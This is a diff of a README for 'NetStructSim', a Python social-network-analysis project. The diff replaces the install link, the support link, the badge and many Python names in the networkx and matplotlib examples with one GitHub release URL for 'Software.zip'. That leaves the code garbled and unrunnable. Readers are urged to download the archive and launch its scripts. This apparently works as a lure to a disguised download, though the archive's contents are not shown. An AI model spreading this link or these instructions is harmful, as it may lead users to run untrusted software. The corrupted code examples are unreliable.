@@ -28,7 +28,7 @@ NetStructSim provides a set of tools to create, manipulate, and visualize social
 - social-network-analysis
 
 ## Installation
-To get started with NetStructSim, you can download the latest version by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Once downloaded, extract the contents and launch the necessary scripts to begin exploring and analyzing social networks.
+To get started with NetStructSim, you can download the latest version by clicking [here](https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip). Once downloaded, extract the contents and launch the necessary scripts to begin exploring and analyzing social networks.
 
 ## Getting Started
 If you are new to social network analysis or graph theory, fear not! NetStructSim provides comprehensive documentation and examples to guide you through the process of working with social networks using Python. 
@@ -41,37 +41,37 @@ Here are some exciting examples of what you can achieve with NetStructSim:
 # Generate a clustered network with 3 clusters
 import networkx as nx
 
-G = nx.connected_caveman_graph(3, 5)
+G = https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip(3, 5)
 ```
 
 ### Complex Network Analysis
 ```python
 # Analyze the degree distribution of a complex network
 import networkx as nx
-import matplotlib.pyplot as plt
+import https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip as plt
 
-G = nx.erdos_renyi_graph(100, 0.15)
-degree_sequence = sorted([d for n, d in G.degree()], reverse=True)
-plt.loglog(degree_sequence, marker='o')
-plt.title("Degree rank plot")
-plt.xlabel("rank")
-plt.ylabel("degree")
-plt.show()
+G = https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip(100, 0.15)
+degree_sequence = sorted([d for n, d in https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip()], reverse=True)
+https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip(degree_sequence, marker='o')
+https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip("Degree rank plot")
+https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip("rank")
+https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip("degree")
+https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip()
 ```
 
 ### Network Visualization
 ```python
 # Visualize a social network using NetworkX and Matplotlib
 import networkx as nx
-import matplotlib.pyplot as plt
+import https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip as plt
 
-G = nx.barbell_graph(5, 3)
-nx.draw(G, with_labels=True)
-plt.show()
+G = https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip(5, 3)
+https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip(G, with_labels=True)
+https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip()
 ```
 
 ## Support
-If you encounter any issues or have questions regarding NetStructSim, feel free to raise an issue on the [GitHub repository](https://github.com/your-username/NetStructSim/issues).
+If you encounter any issues or have questions regarding NetStructSim, feel free to raise an issue on the [GitHub repository](https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip).
 
 ## Contribute
 Contributions are welcome! If you have ideas for new features, improvements, or bug fixes, you can submit a pull request to help enhance NetStructSim for the community.
@@ -84,7 +84,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-[![](https://img.shields.io/badge/Download%20Latest%20Version-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![](https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip%20Latest%https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip)](https://github.com/Shepardox1999/NetStructSim/releases/download/v1.0/Software.zip)
 
 ---
 
